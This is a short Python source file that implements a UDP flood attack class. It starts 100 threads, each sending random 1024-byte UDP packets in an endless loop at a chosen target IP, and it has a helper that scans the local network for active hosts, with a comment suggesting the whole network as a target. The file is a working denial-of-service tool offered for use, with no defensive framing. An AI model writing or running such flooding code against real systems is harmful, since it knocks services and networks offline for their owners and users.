import sys
import time
import random
import threading
from scapy.all import *
import LocalNetworkScan as Scan


class UDP_Flood:
    """Class that contains the functionality for a UDP flood attack"""

    # TODO: Add a mode where the whole network is targeted?
    #       Couple of threads per target??

    def __init__(self, target_ip):
        self.localhosts = []
        self.threadlist = []

        # Characteristics
        self.number_of_threads = 100
        self.generate_threads()

        self.running = True
        self.target_ip = target_ip
        self.sent = 0

    # Controls for the attack
    def start(self):
        for x in self.threadlist:
            x.start()

    def stop(self):
        self.running = False
        print('[!] Threads stopped!')

    def generate_threads(self):
        """Used to create a list of threads that perform the same role"""

        for x in range(0, self.number_of_threads):
            self.threadlist.append(threading.Thread(target=self.effect))

    def effect(self):
        """The main body of the attack"""

        # Destination
        port = random.randint(0, 65535)

        # Packet
        pkt = bytes(IP(dst=self.target_ip) / UDP(sport=52, dport=port) / Raw(load=random._urandom(1024)))

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self.running:
            print('Host: {} - Sent: {}'.format(self.target_ip, self.sent), end='\r')
            sock.sendto(pkt, (self.target_ip, port))
            self.sent += 1

    def scan_local_network(self):
        """This method is used to get all active hosts on the current network"""

        self.localhosts = Scan.scan_for_active_hosts()
        print('[!] Scan complete! - {} Hosts found'.format(len(self.localhosts)), flush=True)
